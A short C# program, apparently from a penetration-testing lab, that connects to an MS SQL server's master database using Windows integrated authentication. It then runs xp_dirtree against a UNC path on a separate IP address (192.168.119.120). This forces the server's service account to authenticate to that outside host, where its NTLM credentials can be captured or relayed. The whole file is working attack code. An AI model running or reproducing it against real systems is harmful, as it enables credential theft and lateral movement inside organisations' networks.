using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
       
        static void Main(string[] args)
        {
          String sqlServer = "dc01.corp1.com";
          
          //The default database in MS SQL is called “master”
          String database = "master";
          String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
          SqlConnection con = new SqlConnection(conString);
          
          try
          {
            con.Open();
            Console.WriteLine("Auth success!");
          }
          catch
          {
            Console.WriteLine("Auth failed");
            Environment.Exit(0);
          }
          
          //The SQL query to invoke xp_dirtree contains a number of backslashes, both to escape the double quote required by the SQL query and to escape the backslashes in the UNC path as required by C# strings.
          String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
          SqlCommand command = new SqlCommand(query, con);
          SqlDataReader reader = command.ExecuteReader();
          reader.Close();
    
  
          
     
         
          con.Close();         
          
        }
    }
}
